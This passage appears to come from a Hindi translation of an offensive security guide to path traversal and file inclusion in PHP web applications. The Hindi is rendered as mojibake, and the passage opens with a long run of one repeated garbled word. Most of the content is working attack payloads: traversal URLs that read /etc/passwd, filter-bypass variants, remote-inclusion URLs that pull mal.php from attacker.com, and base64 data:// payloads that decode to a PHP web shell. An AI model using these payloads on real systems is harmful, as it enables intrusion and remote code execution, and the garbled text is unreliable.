рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **рдкрде рдХрдЯреМрддреА рддрдХрдиреАрдХ**

рдкрде рдХрдЯреМрддреА рдПрдХ рд╡рд┐рдзрд┐ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЛ рдорд╛рдирд┐рдкреБрд░реНрде рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдХреНрд╕рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдирд┐рд╢реНрдЪрд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдЫрд▓рдХрд░ рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЗ рдЕрдВрдд рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд░реНрдг рдЬреЛрдбрд╝рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛ рд╕рдХреЗред рд▓рдХреНрд╖реНрдп рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрде рддреИрдпрд╛рд░ рдХрд░рдирд╛ рд╣реИ рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП, рдлрд┐рд░ рднреА рд╡рд╛рдВрдЫрд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреА рдУрд░ рдкрд╣реБрдБрдЪрд╛рдПред

PHP рдореЗрдВ, рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХреЛ рдмрд░рд╛рдмрд░ рдорд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреА рдкреНрд░рдХреГрддрд┐ рдХреЗ рдХрд╛рд░рдгред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, рдФрд░ `/etc/passwd/` рд╕рднреА рдХреЛ рдПрдХ рд╣реА рдкрде рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдЬрдм рдЖрдЦрд┐рд░реА 6 рд╡рд░реНрдг `passwd` рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ `/` рдЬреЛрдбрд╝рдирд╛ (`passwd/` рдмрдирд╛рдирд╛) рд▓рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рджреЗрддрд╛ред
* рдЙрд╕реА рддрд░рд╣, рдЕрдЧрд░ рдлрд╝рд╛рдЗрд▓ рдкрде рдореЗрдВ `.php` рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ `shellcode.php`), рддреЛ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдореЗрдВ рдХреЛрдИ рдкрд░рд┐рд╡рд░реНрддрди рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

рдкреНрд░рджрддреНрдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ `/etc/passwd` рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкрде рдХрдЯреМрддреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд▓рдХреНрд╖реНрдп рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рд╣реЛрддреА рд╣реИ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдЬрд╛рдирдХрд╛рд░реА)ред
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
рдЗрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ, рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓реНрд╕ рдХреА рд╕рдВрдЦреНрдпрд╛ рд▓рдЧрднрдЧ 2027 рд╣реЛ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рд╕рд░реНрд╡рд░ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддреА рд╣реИред

* **рдбреЙрдЯ рд╕реЗрдЧрдореЗрдВрдЯреНрд╕ рдФрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд░реНрдг**: рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╕рд┐рдХреНрд╡реЗрдВрд╕реЗрд╕ (`../`) рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЙрдЯ рд╕реЗрдЧрдореЗрдВрдЯреНрд╕ рдФрд░ рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЬреЛрдбрд╝реА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддреЗ рд╣реБрдПред
* **рдЖрд╡рд╢реНрдпрдХ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓реНрд╕ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг**: рдкреНрд░рдпреЛрдЧ рдФрд░ рддреНрд░реБрдЯрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдХреЛрдИ рднреА рдЬрд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдФрд░ рдлрд┐рд░ `/etc/passwd` рддрдХ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ `../` рд╕рд┐рдХреНрд╡реЗрдВрд╕реЗрд╕ рдХреА рд╕рдЯреАрдХ рд╕рдВрдЦреНрдпрд╛ рдХреНрдпрд╛ рд╣реИ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдХреЛрдИ рднреА рдЬреЛрдбрд╝реА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ (рдЬреИрд╕реЗ `.php`) рдХреЛ рдиреНрдпреВрдЯреНрд░рд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╡рд╛рдВрдЫрд┐рдд рдкрде (`/etc/passwd`) рдЕрдЯреВрдЯ рд░рд╣рддрд╛ рд╣реИред
* **рдПрдХ рдирдХрд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░рдирд╛**: рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡ рди рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдкрде рдХреА рд╢реБрд░реБрдЖрдд рдХрд░рдирд╛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЕрднреНрдпрд╛рд╕ рд╣реИ (рдЬреИрд╕реЗ `a/`)ред рдпрд╣ рддрдХрдиреАрдХ рдПрдХ рд╕рд╛рд╡рдзрд╛рдирд┐рдХ рдЙрдкрд╛рдп рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ рд╕рд░реНрд╡рд░ рдХреЗ рдкрде рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддрд░реНрдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдкрде рдХрдЯреМрддреА рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рд╕рд░реНрд╡рд░ рдХреЗ рдкрде рдкрд╛рд░реНрд╕рд┐рдВрдЧ рд╡реНрдпрд╡рд╣рд╛рд░ рдФрд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рд╕рдВрд░рдЪрдирд╛ рдХреЛ рд╕рдордЭрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рджреГрд╢реНрдп рдХреЛрдИ рднрд┐рдиреНрди рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдФрд░ рд╕рдмрд╕реЗ рдкреНрд░рднрд╛рд╡реА рд╡рд┐рдзрд┐ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╕рд░ рдкрд░реАрдХреНрд╖рдг рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред

**рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ PHP 5.3 рдореЗрдВ рд╕реБрдзрд╛рд░рд╛ рдЧрдпрд╛ рдерд╛ред**

### **рдлрд╝рд┐рд▓реНрдЯрд░ рдмрд╛рдЗрдкрд╛рд╕ рдЯреНрд░рд┐рдХреНрд╕**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## рд░рд┐рдореЛрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢

PHP рдореЗрдВ рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`allow_url_include`** **Off** рд╣реИред рдпрд╣ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ **On** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ PHP рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ **`allow_url_include`** **On** рд╣реИ, рд▓реЗрдХрд┐рди PHP рдмрд╛рд╣рд░реА рд╡реЗрдмрдкреЗрдЬреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд░ рд░рд╣рд╛ рд╣реИ, [рдЗрд╕ рдкреЛрд╕реНрдЯ](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдмреЗрд╕64 рдХреЛ рдбрд┐рдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреА64 PHP рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ, рдЕрдВрддрд┐рдо `+.txt` рдЗрд╕рд▓рд┐рдП рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рдЬреЛ `.txt` рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЙрд╕рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ рдФрд░ b64 рдбрд┐рдХреЛрдб рдХреЗ рдмрд╛рдж рд╡рд╣ рднрд╛рдЧ рдХреЗрд╡рд▓ рдХрдЪрд░рд╛ рд▓реМрдЯрд╛рдПрдЧрд╛ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ PHP рдХреЛрдб рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛ (рдФрд░ рдЗрд╕рд▓рд┐рдП, рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдЧрд╛)ред
{% endhint %}

рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг **`php://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## рдкрд╛рдпрдерди рд░реВрдЯ рддрддреНрд╡

рдкрд╛рдпрдерди рдореЗрдВ рдЗрд╕ рддрд░рд╣ рдХреЗ рдХреЛрдб рдореЗрдВ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **`file_name`** рдореЗрдВ **рдкреВрд░реНрдг рдкрде** рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдкрд┐рдЫрд▓рд╛ рдкрде рдмрд╕ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
рдпрд╣ рдЗрдЪреНрдЫрд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝](https://docs.python.org/3.10/library/os.path.html#os.path.join) рдХреЗ рдЕрдиреБрд╕рд╛рд░:

> рдпрджрд┐ рдХреЛрдИ рдШрдЯрдХ рдПрдХ рдкреВрд░реНрдг рдорд╛рд░реНрдЧ рд╣реИ, рддреЛ рд╕рднреА рдкрд┐рдЫрд▓реЗ рдШрдЯрдХ рдЫреЛрдбрд╝ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдЬреЛрдбрд╝рдирд╛ рдкреВрд░реНрдг рдорд╛рд░реНрдЧ рдШрдЯрдХ рд╕реЗ рдЬрд╛рд░реА рд░рд╣рддрд╛ рд╣реИред

## рдЬрд╛рд╡рд╛ рд╕реВрдЪреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЬрд╛рд╡рд╛ рдореЗрдВ рдПрдХ рдкрде рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рд╣реИ рдФрд░ рдЖрдк **рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддреЗ рд╣реИрдВ** рдмрдЬрд╛рдп рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ, рддреЛ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕реВрдЪреА рд╡рд╛рдкрд╕ рд▓реМрдЯрд╛рдИ рдЬрд╛рдПрдЧреА**ред рдпрд╣ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдЧрд╛ (рдЬреИрд╕рд╛ рдХрд┐ рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ)ред

## рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░

